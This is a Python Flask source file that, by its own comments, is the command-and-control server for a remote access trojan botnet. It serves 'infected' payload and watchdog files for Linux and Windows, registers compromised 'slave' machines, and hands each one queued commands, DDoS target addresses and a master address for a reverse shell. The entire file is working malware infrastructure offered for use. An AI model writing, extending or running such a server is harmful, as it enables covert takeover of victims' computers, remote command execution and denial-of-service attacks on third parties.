from flask import request, render_template
from flask import Flask , request, redirect, render_template , sessions, session, url_for, send_from_directory, send_file
import flask
import os
import sqlite3
import apext_db


app = Flask(__name__, static_folder='static')
app.secret_key= os.urandom(24).hex()

ip = '192.168.1.6'
port = '5000'

#   HOME LINK WILL DETECT WHAT OS THE VISITOR IS RUNNING AND SEND INFECTED FILE ACCORDINGLY  #


### LINUX PAYLOAD AND WATHCDOG ###

@app.route('/downloads/linux/watchdog')
def download_linux_watchdog():
    print(request.user_agent.string)
    return send_file('./static/linux/watchdog', as_attachment=True)

@app.route('/downloads/linux/payload')
def download_linux_payload():
    print(request.user_agent.string)
    return send_file('./static/linux/payload', as_attachment=True)

### WINDOWS PAYLOAD AND WATCHDOG ###
@app.route('/downloads/windows/watchdog')
def download_windows_watchdog():
    print(request.user_agent.string)
    return send_file('./static/windows/watchdog', as_attachment=True)

@app.route('/downloads/windows/payload')
def download_windows_payload():
    print(request.user_agent.string)
    return send_file('./static/windows/payload.exe', as_attachment=True)

#   LINK TO REGISTER SLAVE, SLAVES WILL BE REDIRECTED TO THIS LINK  #
@app.route('/register/<ip>/<user>', methods=['POST', 'GET'])
def register(ip, user):
    print(ip + ' ' + user)
    apext_db.register(ip, user)
    print('created users')
    return 'none'

#   LINK TO CHECK IF RAT HAS BEEN REGISTERED, IF NOT IT WILL REDIRECT TO REGISTRATION LINK  #
@app.route('/check_if_registered/<ip>/<user>', methods=['POST', 'GET'])
def check_if_registered(ip, user):
    print('checking if user is registered alrdy')
    try:
        if apext_db.check_rat_exists(ip, user) != None:
            print('he exists')
            print(request.remote_addr)
            return 'True'
        else:
            return redirect(register(str(request.remote_addr), user))

    except TypeError:
        return redirect(register(ip, user))

#   LINK FOR SLAVE TO CHECK FOR NEXT COMMAND. COMMANDS WILL EMPTY AFTER ATTEMPT, PIPING COMMANDS DO NOT WORK YET  #
@app.route('/command/<ip>/<user>', methods=['POST', 'GET'])
def command(ip, user): 
    command = '{0}'.format(apext_db.get_user_command(ip, user))
    apext_db.remove_user_command(ip, user)
    print(command)
    return command

#   IP AND PORT TO DDOS WITH ALL SLAVES #
@app.route('/mass/<ip>/<user>', methods=['POST', 'GET'])
def mass_(ip, user): 
    command = '{0}'.format(apext_db.get_user_command(ip, user))
    apext_db.remove_user_command(ip, user)
    print(command)
    return command

#   IP AND PORT OF THE MASTER TO CONNECT REVERSE SHELL TO   #
@app.route('/rshell/<ip>/<user>', methods=['POST', 'GET'])
def rshell_(ip, user): 
    master_ip = '{0}'.format(apext_db.get_rshell_master(ip, user))
    return master_ip

@app.route('/getip', methods=['POST', 'GET'])
def get_ip(): 
    return str(request.remote_addr)

app.run(host=ip, port=port, threaded=True)
